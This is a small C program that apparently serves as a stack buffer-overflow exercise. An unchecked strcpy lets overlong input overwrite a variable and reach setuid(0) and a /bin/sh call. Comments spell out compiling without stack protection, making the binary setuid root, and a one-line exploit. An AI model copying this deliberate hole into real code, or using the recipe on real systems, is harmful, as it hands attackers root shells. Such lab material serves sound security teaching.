// AFTER => bof.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 128
#define KEY 0x61616161

// COMPILE $ gcc -fno-stack-protector bof2.c -o bof2
// SETUID  $ sudo chown root:root bof2
//         $ sudo chmod 4755 bof2
// EXPLOIT $ ./bof2 `python -c "print 'a'*144"`

void vuln(char * arg) {
    int innocent;
    char buf[BUF_SIZE];

    strcpy(buf, arg);
    printf("Hello %s!\n", buf);

    if (innocent == KEY) {
        if (setuid(0)) {
            perror("setuid");
            return 1;
        }
        system("/bin/sh");
    }
}

int main(int argc, char *argv[]){
    if (argc < 2) {
        fputs("\033[31m" "error :( this program needs some arguments\n" "\033[0m", stderr);
        return 1;
    }
    vuln(argv[1]);
    return 0;
}
